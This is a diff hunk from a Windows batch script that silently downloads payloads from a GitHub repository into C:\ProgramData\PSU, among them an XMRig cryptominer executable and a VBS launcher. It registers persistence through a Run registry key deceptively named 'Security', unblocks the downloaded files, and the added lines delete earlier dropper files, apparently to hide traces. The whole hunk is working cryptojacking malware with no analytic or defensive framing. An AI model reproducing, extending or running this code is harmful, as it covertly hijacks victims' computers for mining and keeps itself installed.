@@ -16,6 +16,8 @@ curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/smb.txt" -o
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/start.txt" -o "C:\ProgramData\PSU\start.vbs" >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/xmrig.txt" -o "C:\ProgramData\PSU\xmrig.exe" >> nul
 timeout 1 >> nul
+del "C:\ProgramData\word.bat"
+del "C:\ProgramData\world.vbs"
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
 powershell.exe Unblock-File -Path "*"
 powershell.exe Unblock-File -Path "C:\ProgramData\PSU\*"
